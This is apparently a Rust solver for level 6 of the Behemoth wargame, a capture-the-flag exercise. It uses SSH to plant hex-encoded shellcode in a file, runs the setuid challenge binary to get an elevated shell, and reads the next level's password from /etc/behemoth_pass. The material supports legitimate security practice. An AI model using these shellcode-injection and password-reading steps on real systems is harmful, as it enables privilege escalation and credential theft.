use crate::util::*;
use anyhow::Result;

/// behemoth6 runs behemoth6_reader, and if that process returns 'HelloKitty' then behemoth6 will open a suid shell
/// behemoth6_reader, in turn, opens shellcode.txt and will mem map and then run its contents.
/// so the solution is to create some shellcode that will return that required text.
/// two further restrictions: shellcode cannot contain 0xb and must be shorter than 4095 bytes - both easily avoidable.
/// we can re-use reading shell code used in earlier challenges
pub fn solve(password: &str) -> Result<String> {
    
    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "behemoth6", password)?;
    ssh.read_until("$ ")?;

    println!("creating a tmp folder and moving to it");
    ssh.write_line("cd $(mktemp -d)")?;
    ssh.read_until("$ ")?;

    println!("creating input files (flag and shellcode)");
    ssh.write_line("echo -n HelloKitty > flag.txt")?;
    ssh.read_until("$ ")?;
    let shellcode = hex_decode(super::READ_FILE_SHELLCODE)?;
    ssh.write_line(
        &format!(
            "echo -en \"{}flag.txt\" > shellcode.txt",
            hex_encode(&shellcode)
        ),
    )?;
    ssh.read_until("$ ")?;

    println!("starting behemoth6 to get suid shell");
    ssh.write_line("/behemoth/behemoth6")?;
    ssh.read_until("$ ")?;

    ssh.write_line("cat /etc/behemoth_pass/behemoth7")?;
    let result = ssh.read_until("$ ")?;
    let result = result
        .split(['\r', '\n'])
        .map(|s| s.trim())
        .find(|s| s.len() == 10)
        .unwrap();
    println!("retrieved behemoth7 pass '{result}'\n");

    Ok(result.to_string())
}
